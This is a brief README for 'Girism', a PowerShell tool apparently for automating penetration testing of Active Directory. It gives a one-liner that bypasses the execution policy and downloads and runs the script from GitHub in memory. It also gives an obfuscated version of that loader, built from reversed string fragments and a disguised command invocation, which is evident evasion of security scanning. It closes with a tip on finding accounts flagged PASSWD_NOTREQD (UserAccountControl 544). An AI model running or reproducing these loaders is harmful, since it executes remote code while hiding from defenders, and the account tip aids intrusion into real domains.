# Girism
Guided Infiltration and Reconnaissance Initiative for System Manipulation (GIRISM)

*Automating Penetration testing of Active Directory*

Import-Module .\Girism.ps1
Type Girism and then allow the script to load into the current Powershell session.
Follow the on-screen instructions afterwards.

IEX:

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/main/Girism.ps1'))

OBF IEX:

" $(SeT-iTEm 'vaRiABlE:OFs'  '') "+ ( [STrINg] [rEGEX]::MatChes( "xEI |)93]rahC[,'1LI' eCAlpEr-  )')'+')'+'1LI1sp.msiriG'+'/nia'+'m/msi'+'riG/o'+'h'+'oZniMAI/moc.'+'tne'+'tnoc'+'resubu'+'ht'+'ig'+'.wa'+'r//:sp'+'tth1LI'+'(gnirtSdaolnw'+'oD.)tneilCb'+'eW.t'+'e'+'N.met'+'syS '+'t'+'ce'+'jbO-weN(( xei '+';2703 rob'+'- locot'+'orPytiruceS'+'::]rega'+'naM'+'tnioPecivreS.teN.m'+'et'+'syS[ = l'+'o'+'cotorPytiruce'+'S:'+':]rega'+'naM'+'tnioPe'+'civr'+'eS.teN.'+'me'+'tsy'+'S[ ;'+'e'+'croF-'+' ss'+'ecorP '+'ep'+'ocS- s'+'sapyB ycilo'+'P'+'noituc'+'exE-teS'(( " , '.' ,'R'+'Ig'+'httoL'+'eFt') | %{$_ })+"$( SET-ITeM 'variAble:OFs'  ' ' )" | & ( $enV:COmsPEc[4,15,25]-JoIN'')

##Empty password in Active Directory: I found out that the reason for an empty password in Active Directory can be found here – in the UserAccountControl Attribute.
In this attribute the flag “PASSWD_NOTREQD” can be set. If this flag is set, a domain administrator can issue an empty password, evading the password policy.
For accounts with the flag “PASSWD_NOTREQD” set, the attribute “UserAccountControl” has the value 544.


